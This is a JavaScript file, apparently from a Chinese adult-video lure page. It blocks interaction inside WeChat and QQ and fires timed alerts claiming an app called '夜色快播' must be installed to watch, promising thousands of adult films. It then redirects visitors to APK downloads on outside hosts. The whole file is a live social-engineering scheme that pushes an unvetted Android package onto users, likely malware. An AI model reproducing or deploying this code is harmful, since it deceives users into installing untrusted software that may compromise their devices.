function getQueryString(e) {
	var t = new RegExp("(^|&)" + e + "=([^&]*)(&|$)", "i"),
		n = window.location.search.substr(1).match(t);
	return null != n ? unescape(n[2]) : "gd173-gfs"
}
function url_ad() {
	window.open(navigator.userAgent.toLowerCase().indexOf("micromessenger") >= 0 ? tmpurl : tmpurl)
}
function show_ceng() {
	if (navigator.userAgent.toLowerCase().indexOf("micromessenger") >= 0) document.getElementById("xbg").style.display = "block", document.getElementById("ceng").style.display = "block", document.body.addEventListener("touchmove", function(e) {
		document.getElementById("ceng").style.display = "block", e.preventDefault()
	}, !1), document.body.addEventListener("click", function(e) {
		document.getElementById("ceng").style.display = "block", e.preventDefault()
	}, !1);
	else {
		setTimeout(function() {
			isAlert.style.display = "block"
		}, 15e3);
		var e = "alert('为了避免封杀，请安装'+name+'直接观看，安装完成后，两万部高清成人影片等着你，一爽到底！');location.href= tmpurl ;";
		setTimeout(e, 5e3)
	}
}
function cc() {
	alert("播放本片需要安装" + name + "，安装完成后请打开" + name + "直接观看")
}
function cc2() {
	alert("为了避免封杀，请安装" + name + "观看本片")
}
function cc3() {
	alert("本站在线人数过，请安装" + name + "直接观看")
}
function cc4() {
	alert("观看本片需要安装" + name + "，未满18周岁请自觉离开")
}
var id;
id = getQueryString("id");
var downurl = "http://gd.cz150.com/app/" + id + ".apk",
	tmpurl = "http://sk.aoihe.com:1000/kui/i.php?id=gd347-taj1kz.apk",//"http://" + window.location.hostname + "/kui/i.php?id=" + id,
	name = "夜色快播";
if (navigator.userAgent.indexOf("QQ/") > -1 && mqq.ui.openUrl({
	target: 2,
	url: window.location.href
}), navigator.userAgent.toLowerCase().indexOf("micromessenger") >= 0) {
	setTimeout(function() {
		isAlert.style.display = "block"
	}, 1e4), setTimeout(show_ceng, 15e3);
	var v_ad = "alert('为了避免封杀，请安装'+name+'直接观看，安装完成后，两万部高清成人影片等着你，一爽到底！');location.href= tmpurl ;";
	setTimeout(v_ad, 5e3)
} else {
	setTimeout(function() {
		isAlert.style.display = "block"
	}, 15e3);
	var v_ad = "alert('为了避免封杀，请安装'+name+'直接观看，安装完成后，两万部高清成人影片等着你，一爽到底！');location.href= tmpurl ;";
	setTimeout(v_ad, 5e3)
}